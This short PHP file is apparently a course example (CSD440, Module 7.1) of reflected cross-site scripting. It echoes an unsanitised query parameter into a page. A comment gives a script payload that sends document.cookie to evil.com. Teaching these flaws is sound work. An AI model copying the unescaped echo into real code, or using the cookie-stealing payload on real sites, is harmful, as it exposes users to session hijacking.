<?php
/**
 * XSS Vulnerable Example
 * Module 7.1 Discussion Board — CSD440
 * 
 * DO NOT USE IN PRODUCTION. This demonstrates unsafe echoing
 * of user input without sanitization.
 */

echo "<h1>Search results for: " . $_GET["query"] . "</h1>";

// Try entering: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
// The browser executes this JavaScript, sending session cookies to the attacker.
?>
